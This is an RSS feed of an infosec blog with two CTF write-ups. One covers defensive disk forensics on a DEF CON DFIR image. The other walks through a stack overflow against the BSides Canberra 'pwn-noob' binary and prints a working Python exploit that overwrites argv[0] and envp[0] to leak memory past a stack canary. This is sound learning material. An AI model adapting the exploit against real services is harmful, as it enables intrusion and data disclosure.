<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <docs>https://blogs.law.harvard.edu/tech/rss</docs>
    <title>0xbc&#39;s blog</title>
    <link>https://0xbc.blog/</link>
    <description>Recent content on 0xbc&#39;s blog</description>
    <ttl>1440</ttl>
    <generator>After Dark 7.2.1 (Hugo 0.55.5)</generator>
    <language>en-AU</language>
    <lastBuildDate>Tue, 07 May 2019 10:34:23 +0930</lastBuildDate>
    
      <atom:link href="https://0xbc.blog/index.xml" rel="self" type="application/rss+xml" />
    
    
      <item>
        <title>DEF CON DFIR CTF 2018 Write-up Part 1 - HR Server Basic Challenges</title>
        <link>https://0xbc.blog/post/defcon-dfir-ctf-2018-part-1/</link>
        <pubDate>Tue, 07 May 2019 10:34:23 +0930</pubDate>
        <dc:creator>Ben Cheney</dc:creator>
        <guid>https://0xbc.blog/post/defcon-dfir-ctf-2018-part-1/</guid>
        <description>Introduction I&amp;rsquo;m heading to DEF CON in Vegas this year and thinking about participating in the DFIR CTF that runs at the Blue Team Village. As a bit of a warm-up, I thought I&amp;rsquo;d give last year&amp;rsquo;s DFIR CTF a crack, which is still available to play online at the time of writing - you can find details for how to sign-up and obtain the images here. Without further ado, here&amp;rsquo;s a write-up of the challenges that I&amp;rsquo;ve managed to complete so far, which I&amp;rsquo;m writing mainly so I can remember the tools and commands for next time&amp;hellip;
</description>
        <category domain="https://0xbc.blog/categories/writeups">Writeups</category>
        <content:encoded><![CDATA[Introduction I&amp;rsquo;m heading to DEF CON in Vegas this year and thinking about participating in the DFIR CTF that runs at the Blue Team Village. As a bit of a warm-up, I thought I&amp;rsquo;d give last year&amp;rsquo;s DFIR CTF a crack, which is still available to play online at the time of writing - you can find details for how to sign-up and obtain the images here. Without further ado, here&amp;rsquo;s a write-up of the challenges that I&amp;rsquo;ve managed to complete so far, which I&amp;rsquo;m writing mainly so I can remember the tools and commands for next time&amp;hellip;
I used the SANS SIFT Workstation for the challenge tasks. If you&#39;re not familiar with it, it&#39;s an excellent distribution for doing DFIRy things - check it out at the SANS DFIR website. HR Server - Basic Challenges While there are three images to download, they&amp;rsquo;re all encrypted and only the password for one image is provided initially: the &amp;ldquo;HR Server&amp;rdquo;.
The HR Server image is an Expert Witness compresion Format (EWF) file, which I mounted using the following commands (you can find these on the SIFT Workstation cheat sheet):
$ sudo ewfmount HRServer_Disk0.e01 /mnt/ewf $ mount –o loop,ro,show_sys_files,streams_interface=windows,offset=525336576 /mnt/ewf/ewf1 /mnt/windows_mount The offset in the mount command above was calculated by multiplying the starting sector of the target partition by 512 (the number of bytes in a sector for this hard drive). The starting sector of the partition (1026048) was recovered with the mmls command:
# mmls /mnt/ewf/ewf1 DOS Partition Table Offset Sector: 0 Units are in 512-byte sectors Slot Start End Length Description 000: Meta 0000000000 0000000000 0000000001 Primary Table (#0) 001: ------- 0000000000 0001026047 0001026048 Unallocated 002: 000:000 0001026048 0104857599 0103831552 NTFS / exFAT (0x07) Acquisition Software Name and Version The first two questions ask you to recoved the name and version of the acquisition software that was used to obtain the image. You can find this information with the ewfinfo command:
# ewfinfo /home/sansforensics/defcon/HRServer_Disk0.e01 ewfinfo 20140806 Acquiry information Description:	HRServer_Disk0 Examiner name:	Professor Frink Acquisition date:	Wed Aug 8 14:32:43 2018 System date:	Wed Aug 8 14:32:43 2018 Operating system used:	Win 10 (64 bit) Software version used:	XWF 19.6 &amp;lt;-- acquisition software ... MFT Entry Name The next question asks you for the file name that represents MFT entry 168043. Note that the answer for this question also required knowledge of the partition&amp;rsquo;s starting offset (this time expressed in sectors instead of bytes).
# istat -o 1026048 ewf1 168043 MFT Entry Header Values: Entry: 168043 Sequence: 1 $LogFile Sequence Number: 195192139 Allocated File Links: 2 ... $FILE_NAME Attribute Values: Flags: Archive Name: pip3.7.exe Parent MFT Entry: 167052 Sequence: 1 Allocated Size: 0 Actual Size: 0 Created:	2018-07-23 13:39:41.412153100 (UTC) File Modified:	2018-07-23 13:39:41.412153100 (UTC) MFT Modified:	2018-07-23 13:39:41.412153100 (UTC) Accessed:	2018-07-23 13:39:41.412153100 (UTC) MFT Entry Number Next up, we need to find the MFT entry number for a specific file. Seeing as we&amp;rsquo;ve mounted the filesystem, we can simply use ls:
# ls -ial /mnt/windows_mount/xampp/mysql/bin/mysql.exe 115322 -rwxrwxrwx 1 root root 3770280 Mar 26 2018 /mnt/windows_mount/xampp/mysql/bin/mysql.exe The MFT entry is shown at the beginning of the line - 115322.
MFT Attribute ID We now need to find the &amp;ldquo;MFT Attribute ID&amp;rdquo; of the &amp;ldquo;named $J&amp;rdquo; data attribute for the MFT entry with a file name of $UsnJrnl. OK then!
# find -name &amp;#39;$UsnJrnl&amp;#39; ./$Extend/$UsnJrnl # ls -ial /mnt/windows_mount/\$Extend/\$UsnJrnl 108606 ---------- 1 root root 0 May 1 2018 /mnt/windows_mount/$Extend/$UsnJrnl # istat -o 1026048 /mnt/ewf/ewf1 108606 ... Attributes: Type: $STANDARD_INFORMATION (16-0) Name: N/A Resident size: 72 Type: $FILE_NAME (48-1) Name: N/A Resident size: 82 Type: $DATA (128-3) Name: $J Non-Resident, Sparse size: 368717664 init_size: 368717664 ... In the brackets for the $J data attribute above, 3 is the attribute ID (I think 128 is probably the attribute flags, although I haven&amp;rsquo;t confirmed this - I was just inferring it from this blog post).
SMB Things changed up a bit with this question - what IP address attempted an anonymous SMB logon at 2018-08-08 18:10:38.554 (UTC)?
I went to the event logs for the answer here, using Willi Ballenthin&amp;rsquo;s excellent python-evtx library to parse the logs to XML, then just searched for the timestamp:
# evtx_dump.py /mnt/windows_mount/Windows/System32/winevt/Logs/Microsoft-Windows-SMBServer%4Security.evtx &amp;gt;SMBSecurityEvents.xml # grep -B7 -A23 &amp;#34;18:10:38.554&amp;#34; SMBSecurityEvents.xml &amp;lt;Event xmlns=&amp;#34;http://schemas.microsoft.com/win/2004/08/events/event&amp;#34;&amp;gt;&amp;lt;System&amp;gt;&amp;lt;Provider Name=&amp;#34;Microsoft-Windows-SMBServer&amp;#34; Guid=&amp;#34;{d48ce617-33a2-4bc3-a5c7-11aa4f29619e}&amp;#34;&amp;gt;&amp;lt;/Provider&amp;gt; &amp;lt;EventID Qualifiers=&amp;#34;&amp;#34;&amp;gt;551&amp;lt;/EventID&amp;gt; &amp;lt;Version&amp;gt;2&amp;lt;/Version&amp;gt; &amp;lt;Level&amp;gt;2&amp;lt;/Level&amp;gt; &amp;lt;Task&amp;gt;551&amp;lt;/Task&amp;gt; &amp;lt;Opcode&amp;gt;0&amp;lt;/Opcode&amp;gt; &amp;lt;Keywords&amp;gt;0x0810000000000008&amp;lt;/Keywords&amp;gt; &amp;lt;TimeCreated SystemTime=&amp;#34;2018-08-08 18:10:38.554293&amp;#34;&amp;gt;&amp;lt;/TimeCreated&amp;gt; &amp;lt;EventRecordID&amp;gt;4517&amp;lt;/EventRecordID&amp;gt; &amp;lt;Correlation ActivityID=&amp;#34;&amp;#34; RelatedActivityID=&amp;#34;&amp;#34;&amp;gt;&amp;lt;/Correlation&amp;gt; &amp;lt;Execution ProcessID=&amp;#34;4&amp;#34; ThreadID=&amp;#34;1940&amp;#34;&amp;gt;&amp;lt;/Execution&amp;gt; &amp;lt;Channel&amp;gt;Microsoft-Windows-SMBServer/Security&amp;lt;/Channel&amp;gt; &amp;lt;Computer&amp;gt;WIN-29U41M70JCO&amp;lt;/Computer&amp;gt; &amp;lt;Security UserID=&amp;#34;S-1-5-18&amp;#34;&amp;gt;&amp;lt;/Security&amp;gt; &amp;lt;/System&amp;gt; &amp;lt;UserData&amp;gt;&amp;lt;EventData xmlns=&amp;#34;Smb2Namespace&amp;#34;&amp;gt;&amp;lt;SessionGUID&amp;gt;{00000000-0000-0000-0000-000000000000}&amp;lt;/SessionGUID&amp;gt; &amp;lt;ConnectionGUID&amp;gt;{00000000-0000-0000-0000-000000000000}&amp;lt;/ConnectionGUID&amp;gt; &amp;lt;Status&amp;gt;0xc0000022&amp;lt;/Status&amp;gt; &amp;lt;TranslatedStatus&amp;gt;0xc0000022&amp;lt;/TranslatedStatus&amp;gt; &amp;lt;ClientAddressLength&amp;gt;128&amp;lt;/ClientAddressLength&amp;gt; &amp;lt;ClientAddress&amp;gt;AgAhgVBRbjIAAAAAAAAAAAAA//9QUW4yAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&amp;lt;/ClientAddress&amp;gt; &amp;lt;SessionId&amp;gt;0x0000000000000000&amp;lt;/SessionId&amp;gt; &amp;lt;UserNameLength&amp;gt;15&amp;lt;/UserNameLength&amp;gt; &amp;lt;UserName&amp;gt;ANONYMOUS LOGON&amp;lt;/UserName&amp;gt; &amp;lt;ClientNameLength&amp;gt;14&amp;lt;/ClientNameLength&amp;gt; &amp;lt;ClientName&amp;gt;\\80.81.110.50&amp;lt;/ClientName&amp;gt; &amp;lt;SPN&amp;gt;session setup failed before the SPN could be queried&amp;lt;/SPN&amp;gt; &amp;lt;SPNValidationPolicy&amp;gt;0&amp;lt;/SPNValidationPolicy&amp;gt; &amp;lt;/EventData&amp;gt; &amp;lt;/UserData&amp;gt; &amp;lt;/Event&amp;gt; You can see the IP address in the ClientName element above.
Saved Batch File The next requirement is to supply the name of a batch file saved by the mpowers user. At this point, I thought I&amp;rsquo;d construct a super timeline with the venerable log2timeline and import it into an ELK stack to assist further analysis.
For my own future reference, these are the commands I used to create the super timeline and export them into Elasticsearch:
# log2timeline.py -f filter timeline.plaso /mnt/ewf/ewf1 # psort.py -o elastic --server $ELK_IP --port 9200 --raw_fields --index_name hrserver timeline.plaso I used Mark Hallman&amp;rsquo;s Windows Plaso filters, which you can find my fork of here.
Once all the data was ingested, I ran a query to search for entries in user registry hives (i.e. ntuser.dat) that contained the string &amp;ldquo;bat&amp;rdquo;, as there are several places in the user registry where evidence of recent files gets left lying around. The search revealed the presence of a file called C:\Production\update_app.bat (as shown below), which was the correct answer.
HR Management Application The next question asks for the name of the HR management applcation that hosts a webserver. While one valid way of solving this question would be simply to inspect the contents of the Program Files folder on the filesystem, there are some clues in the Windows Firewall logs too, as shown below:
OrangeHRM&amp;hellip; sounds juicy! (Sorry.)
There&amp;rsquo;s a follow-up question then, which is to find the public URL for the HR system&amp;rsquo;s portal. This can be found by diving through the Apache access logs at C:\Program Files\OrangeHRM\4.1\apache\logs\access.log.
... 74.118.139.108 - - [11/Jul/2018:13:25:31 -0700] &amp;quot;GET /symfony/web/webres_5acde3dbd3adc6.90334155/js/jquery/validate/jquery.validate.js HTTP/1.1&amp;quot; 200 39131 &amp;quot;http://74.118.139.108/symfony/web/index.php/auth/login&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&amp;quot; 7 ...  File Changes This batch of questions ends on some more disk forensics. Firstly, we&amp;rsquo;re asksed to name the file that had a change recorded with an update sequence number of 368701440. Plaso had already nicely ingested the USN Journal for me, so I just searched for the number in Kibana and found it straight away:
The final question asked for the deleted file with a &amp;ldquo;reference number&amp;rdquo; of 12947848928752043. I was a bit unsure about this one, and ended up consulting another write-up for a nudge.
First thing to do is to convert the number into a hex value, which is 0x2E00000000F1AB. This looks a lot more meaningful and parsable. Next thing I did was to find the specification for what an NTFS &amp;ldquo;reference number&amp;rdquo; is. I found the MS docs on the topic to be fairly verbose&amp;hellip; being impatient, I looked for something more succinct and came across this link. As per the layout, the FILE record number is 0x00000000F1AB (61867), and the sequence number is 0x002E (46).
This info is once again available from Plaso, which reveals the filename to be _MEI78882, and indeed suggests that the file was deleted:
Phew&amp;hellip; that&amp;rsquo;s it for the &amp;ldquo;basic&amp;rdquo; questions on the HR Server. I&amp;rsquo;ll be back with anoher post if I manage to crack the &amp;ldquo;Advanced&amp;rdquo; one!
]]></content:encoded>
      </item>
    
      <item>
        <title>BSides Canberra pwn-noob CTF Write-up</title>
        <link>https://0xbc.blog/post/bsides-cbr-pwn-noob-writeup/</link>
        <pubDate>Thu, 27 Apr 2017 22:47:58 +0930</pubDate>
        <dc:creator>Ben Cheney</dc:creator>
        <guid>https://0xbc.blog/post/bsides-cbr-pwn-noob-writeup/</guid>
        <description>Introduction The first exploitation (pwnable) challenge at the BSides Canberra 2017 CTF was pwn-noob - and clearly, I&amp;rsquo;m an über-noob because I couldn&amp;rsquo;t figure out how to pwn it during the comp.
However, a couple of nights later (with a couple of gentle nudges from CTF-organiser extraordinaire OJ), I finally got there! Here&amp;rsquo;s a brief rundown of the challenge binary, concluding with a script which implements a working exploit.
</description>
        <category domain="https://0xbc.blog/categories/writeups">Writeups</category>
        <content:encoded><![CDATA[Introduction The first exploitation (pwnable) challenge at the BSides Canberra 2017 CTF was pwn-noob - and clearly, I&amp;rsquo;m an über-noob because I couldn&amp;rsquo;t figure out how to pwn it during the comp.
However, a couple of nights later (with a couple of gentle nudges from CTF-organiser extraordinaire OJ), I finally got there! Here&amp;rsquo;s a brief rundown of the challenge binary, concluding with a script which implements a working exploit.
Note that (almost) all of the BSides Canberra 2017 CTF challenges can be spun up at your leisure using Docker - see OJ&#39;s blog and corresponding GitHub repo for more info. Overview, Manual Inspection and Disassembly A version of the binary is provided for local inspection and exploit development (noob_download), but the version with the challenge flag runs remotely and needs to be pwned via a network service running on port 6000 on a Docker image.
If you&#39;ve never attempted a binary exploitation challenge during a CTF before, the idea is usually to try and find an exploitable flaw in a piece of code that can be leveraged into arbitrary code execution. In a typical scenario, you&#39;d then run shellcode via your exploit in order to retrieve a flag from a target machine. The binary in this case appeared to be a 64-bit ELF executable:
$ file noob_download noob_download: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f4bee3f353654b6ab1343af0af59bf888cc21dc, not stripped &amp;ldquo;LSB executable&amp;rdquo; (to my knowledge) indicates that we&amp;rsquo;re not dealing with position-independent code (as opposed to &amp;ldquo;LSB shared object&amp;rdquo;), so ASLR bypasses weren&amp;rsquo;t required.
The main method (located at address 0x400686) disassembles as per the following:
Further manual inspection of the binary also revealed the following string in the .rodata section, which looked pretty important&amp;hellip;
So - the flag string was located at 0x400800, altough the content of the flag on the challenge server was different, of course (drat!).
Poking the Bear Time to run the program: $ ./noob_download Gimme the data: hello Go on then, break me: ok then $
So, as far as interactivity goes, the program does the following:
 Reads from stdin using fgets, storing up to 0x20 (32) bytes of input in the statically-allocated array labeled whateva. Reads from stdin again using fgets, this time storing up to 0x190 (400) bytes of input in the stack variable labeled var_28 (by the disassembler).  The whateva label points to a 32-byte area in the .bss section, located at 0x601040:
So, given that we&amp;rsquo;re able to get 400 bytes of input on the stack at a location only 0x28 (40) bytes from the frame pointer (during the second lot of input), it seemed like we might be in smash-the-stack-for-fun-and-profit territory. To wit:
$ python -c &amp;#34;print &amp;#39;\n&amp;#39; &#43; &amp;#39;A&amp;#39;*200&amp;#34; | ./noob_download Gimme the data: Go on then, break me: *** stack smashing detected ***: ./noob_download terminated Aborted (core dumped) Fly in the Ointment Bah, humbug&amp;hellip; a stack canary! Note the line of disassembly at 0x400699, which reads a value from fs:[0x28] and subsequently places it on the stack at var_10. The function epilogue checks that this value hasn&amp;rsquo;t been altered (0x400738 - 0x400745) - if it has, then it calls __stack_chk_fail, which terminates execution.
I checked to see whether the value being checked was static (and hence could simply be placed on the stack in the right spot as part of the payload), but alas, the canary was being randomly generated during each run of the program. As such, I wasn&amp;rsquo;t going to be able to simply overwrite the saved return pointer and gain code execution.
At this point, I wasn&amp;rsquo;t really sure what to do next, having never tried to defeat a stack canary before. So, I just started noodling around. Playing around with different payload sizes revealed that the output of the canary check was changing, and in some cases, completely disappearing:
$ python -c &amp;#34;print &amp;#39;\n&amp;#39; &#43; &amp;#39;A&amp;#39;*263&amp;#34; | ./noob_download Gimme the data: Go on then, break me: *** stack smashing detected ***: terminated Aborted (core dumped) $ python -c &amp;#34;print &amp;#39;\n&amp;#39; &#43; &amp;#39;A&amp;#39;*265&amp;#34; | ./noob_download Gimme the data: Go on then, break me: Segmentation fault (core dumped) Note that with 263 As in the payload, the filename disappeared from the error message, and with 265 As, the message disappeared altogether.
Crack in the Armor As it turns out, the binary was compiled using the FORTIFY_SOURCE option, with an old version of gcc which is vulnerable to an information disclosure bug, as per http://vulnfactory.org/blog/2010/04/27/fun-with-fortify_source/.
To understand what&amp;rsquo;s going on here, consider the following description of what the stack looks like during the execution of main, taken from https://www.win.tue.nl/~aeb/linux/hh/stack-layout.html. (Note that lower addresses are shown at the top in this representation.)
&amp;hellip;
local variables of main
saved registers of main
return address of main
argc
argv
envp
stack from startup code
argc
argv pointers
NULL that ends argv[]
environment pointers
NULL that ends envp[]
ELF Auxiliary Table
argv strings
environment strings
program name
NULL
What we&amp;rsquo;ve done is smashed all the way down from &amp;ldquo;local variables of main&amp;rdquo; and overwritten argv[0] in the &amp;ldquo;argv pointers&amp;rdquo; section. The canary-checking code appears to be blindly reading the contents of argv[0] to get a pointer to a string for printing out the filename as part of its error message.
That means that we can potentially disclose any strings in the running binary by overwriting argv[0] with a custom location&amp;hellip; such as, the flag contents at 0x400800!
After some trial-and-error to get the layout right, I found that the following worked: $ python -c &amp;#34;print &amp;#39;\n&amp;#39; &#43; &amp;#39;A&amp;#39;*264 &#43; &amp;#39;\x00\x08\x40\x00\x00\x00\x00\x00&amp;#39;&amp;#34; | ./noob_download Gimme the data: Go on then, break me: *** stack smashing detected ***: BSIDES_CTF{FLAGISHEREONTHESERVER!} terminated Aborted (core dumped)
Huzzah! We&amp;rsquo;ve smashed down to argv[0] and overwritten it with a (64-bit little-endian) pointer to the flag string. Surely all that remains is to add some scaffolding using sockets to connect to the challenge service (see the script at the end for an example of this), deliver our payload and we&amp;rsquo;re home&amp;hellip; right?? #flaglyfe
Onwards to Victory&amp;hellip; (eventually) It turns out, however, that when you fire this exploit against the challenge network service, there&amp;rsquo;s one more wrinkle to overcome:
$ python pwn-noob.py Gimme the data: Go on then, break me: *** $TERM not set. No stack check fail for you! *** Seems like the server wasn&amp;rsquo;t going to surrender the flag without the TERM environment variable being specified. Looks like we&amp;rsquo;d need to overwrite the area where environment variable strings are stored&amp;hellip;
As per the stack representation above, after the argv pointers, there&amp;rsquo;s a &amp;ldquo;NULL that ends argv[]&amp;rdquo; and then &amp;ldquo;environment pointers&amp;rdquo;: a.k.a. envp[0]. So, we just have to smash down a bit further, past the NULL (which will be 8 bytes for a 64-bit pointer) and then we can overwrite envp[0] with a pointer to something we control, in which we&amp;rsquo;ll place a string that defines the TERM variable.
I got stuck at this point for aaaaagges, as my initial idea was to place a TERM string in the start of my payload, and then place a pointer back to it at envp[0]. I actually don&amp;rsquo;t quite understand why this approach wasn&amp;rsquo;t working - all I can tell you is, don&amp;rsquo;t try it unless you want to run a serious risk of going insane!
As it turns out, I had been completely overlooking the other (arguably far more obvious) location we have control of - whateva, a.k.a. 0x601040. All that was required was to do read in a TERM string during the first fgets call, overwrite envp[0] with a pointer to it, and we&amp;rsquo;d be home (sans another nasty &amp;ldquo;surprise&amp;rdquo;, anyway).
$ python pwn-noob.py Gimme the data: Go on then, break me: *** stack smashing detected *** BSIDES_CTF{d3m_st@kk_proTectionz!} terminated Phew! A script to automate the exploit is shown below.
Exploit Script import socket import struct import sys # pwn-noob.py # exploit for https://github.com/OJ/bsides-2017-ctf-docker/tree/master/pwn-noob def p(addr): # encode addresses as 64-bit little-endian return struct.pack(&amp;#34;&amp;lt;Q&amp;#34;, addr) if len(sys.argv) &amp;gt; 3: print &amp;#34;Usage: pwn-noob.py [host] [port] (defaults to localhost 6000)&amp;#34; sys.exit() elif len(sys.argv) == 3: host = sys.argv[1] port = int(sys.argv[2]) elif len(sys.argv) == 2: host = sys.argv[1] port = 6000 elif len(sys.argv) == 1: host = &amp;#39;localhost&amp;#39; port = 6000 envstring = &amp;#39;TERM=a&amp;#39; # it doesn&amp;#39;t actually matter what you set TERM to, # so long as it&amp;#39;s set flag_addr = 0x400800 # determined by inspecting the binary buffer_addr = 0x601040 # determined by inspecting the binary flag_start_len = 264 # determined by trial-and-error envp_start_len = 8 # skip over 8 bytes of NULL at the end of  # the argv array to get to envp[0] # newlines required to finish calls to fgets (0x4006e9, 0x40072e) payload1 = envstring &#43; &amp;#39;\n&amp;#39; payload2 = &amp;#39;A&amp;#39;*flag_start_len &#43; p(flag_addr) &#43; &amp;#39;B&amp;#39;*envp_start_len &#43; p(buffer_addr) &#43; &amp;#39;\n&amp;#39; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) # Print first prompt, send TERM string, which will be stored at buffer_addr print s.recv(1024) s.send(payload1) # Print second prompt, send stack-smashing junk &#43; argv[0] overwrite  # &#43; junk &#43; envp[0] overwrite print s.recv(1024) s.send(payload2) # Print out the flag print s.recv(1024) s.close()]]></content:encoded>
      </item>
    
      <item>
        <title>About this site</title>
        <link>https://0xbc.blog/about/</link>
        <dc:creator>Ben Cheney</dc:creator>
        <guid>https://0xbc.blog/about/</guid>
        <description> My name is Ben Cheney, and I&amp;rsquo;m an infosec researcher and practitioner located in Adelaide, Australia. Thanks for stopping by!
This blog is a place for write-ups, notes and rants related to infosec (and tech in general), theology, music and whatever else is on my mind.
Some of my online habitations:  Twitter GitHub LinkedIn  </description>
        <content:encoded><![CDATA[ My name is Ben Cheney, and I&amp;rsquo;m an infosec researcher and practitioner located in Adelaide, Australia. Thanks for stopping by!
This blog is a place for write-ups, notes and rants related to infosec (and tech in general), theology, music and whatever else is on my mind.
Some of my online habitations:  Twitter GitHub LinkedIn  ]]></content:encoded>
      </item>
    
      <item>
        <title>Terms</title>
        <link>https://0xbc.blog/terms/</link>
        <dc:creator>Ben Cheney</dc:creator>
        <guid>https://0xbc.blog/terms/</guid>
        <description>The content of this site is © Ben Cheney, 2019 , available under the terms of the CC BY-SA 4.0 licence.
This site was generated using After Dark for Hugo.</description>
        <content:encoded><![CDATA[The content of this site is © Ben Cheney, 2019 , available under the terms of the CC BY-SA 4.0 licence.
This site was generated using After Dark for Hugo.
]]></content:encoded>
      </item>
    
  </channel>
</rss>
